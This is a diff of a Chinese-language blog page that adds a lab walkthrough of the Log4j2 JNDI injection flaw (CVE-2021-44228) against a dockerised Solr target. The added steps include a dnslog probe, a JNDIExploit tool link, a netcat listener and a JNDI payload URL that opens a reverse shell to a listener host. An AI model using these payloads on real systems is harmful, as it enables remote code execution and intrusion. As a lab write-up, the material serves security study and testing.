@@ -214,7 +214,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-08-11 12:28:02 / 修改时间：15:41:56" itemprop="dateCreated datePublished" datetime="2022-08-11T12:28:02+08:00">2022-08-11</time>
+              <time title="创建时间：2022-08-11 12:28:02 / 修改时间：15:43:50" itemprop="dateCreated datePublished" datetime="2022-08-11T12:28:02+08:00">2022-08-11</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -241,15 +241,43 @@
 <p>靶机 ：192.168.129.128_kali</p>
 <p>JNDIExploit.v1.2：链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w">https://pan.baidu.com/s/1lUcyeU-QlSfCEZI-YU4A-w</a> 提取码: xiao </p>
 <h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Apache Log4j 2 是Java语言的日志处理套件，使用极为广泛。在其2.0到2.14.1版本中存在一处JNDI注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p>
-<p><em></em></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol>
+<li><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>在靶机中使用docker搭建</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810113257176-1660185235187.png" alt="image-20220810113257176-1660185235187"></p>
+</li>
+<li><h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5></li>
+</ol>
+<p>在<a target="_blank" rel="noopener" href="http://dnslog.cn/%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%9A%84%E5%9F%9F%E5%90%8D">http://dnslog.cn/获取一个测试的域名</a></p>
+<p>构造数据包dnslog测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.931p5u.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115554880.png" alt="image-20220810115554880"></p>
+<p>存在漏洞</p>
+<ol start="3">
+<li><h5 id="中转机vps环境构建"><a href="#中转机vps环境构建" class="headerlink" title="中转机vps环境构建"></a>中转机vps环境构建</h5></li>
+</ol>
+<p>使用工具exp:Log4j-exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.129.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112602168.png" alt="image-20220810112602168"></p>
+<ol start="4">
+<li><h5 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h5></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112520706-1660198332069.png" alt="image-20220810112520706"></p>
+<ol start="5">
+<li><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.129.130:8983/solr/admin/cores?action=$&#123;jndi:ldap://192.168.129.130:1389/Basic/ReverseShell/192.168.128.130/1234&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810112302254-1660183567356.png" alt="image-20220810112302254-1660183567356"></p>
+<h5 id="6-关闭环境"><a href="#6-关闭环境" class="headerlink" title="6.关闭环境"></a>6.关闭环境</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down --rmi all -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/CVE-2021-44228%EF%BC%88Apache%20Log4j2%20%E6%9F%A5%E6%89%BE%E5%8A%9F%E8%83%BD%20JNDI%20%E6%B3%A8%E5%85%A5%EF%BC%89/image-20220810115216079.png" alt="image-20220810115216079"></p>
+
       
     </div>
 
@@ -344,6 +372,14 @@
       </div>
   </nav>
 </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:xiaojuntongxue00@google.com" title="E-Mail → mailto:xiaojuntongxue00@google.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
 
 
 
